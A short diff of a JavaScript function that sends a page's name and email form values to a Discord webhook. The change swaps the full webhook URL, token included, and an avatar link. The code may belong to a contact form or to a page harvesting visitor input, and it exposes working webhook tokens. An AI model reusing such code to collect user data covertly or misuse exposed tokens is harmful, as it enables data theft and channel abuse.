@@ -2,7 +2,7 @@ function a() {
   var xhr = new XMLHttpRequest();
   xhr.open(
     "POST",
-    "https://discord.com/api/webhooks/919941525448843294/jK1wNY2C7ET_grJ-3md8I2oY7kZRmkn_Lcvvw82sMryJPZ9CtdXwQhVJdvvYEmNOgqd3",
+    "https://discord.com/api/webhooks/1068258827734089769/zxSgr3H6YWv1Lj8BqcV75mKazrXICQxVBPYahdnYmmeRLdM5Nc61RXyF-5Hh6H9htIhP",
     true
   );
   xhr.setRequestHeader("Content-Type", "application/json");
@@ -10,7 +10,7 @@ function a() {
     JSON.stringify({
       username: document.getElementById("name").value,
       avatar_url:
-        "https://cdn.discordapp.com/avatars/717083549483955456/b6f8c6b8d6c9e0e1f9d8f6f8e8f0c7c2.png?size=256",
+        "https://cdn.discordapp.com/attachments/1068258794523599030/1068259009754304532/ME.jpg",
       content:
         "Email: " +
         document.getElementById("email").value +
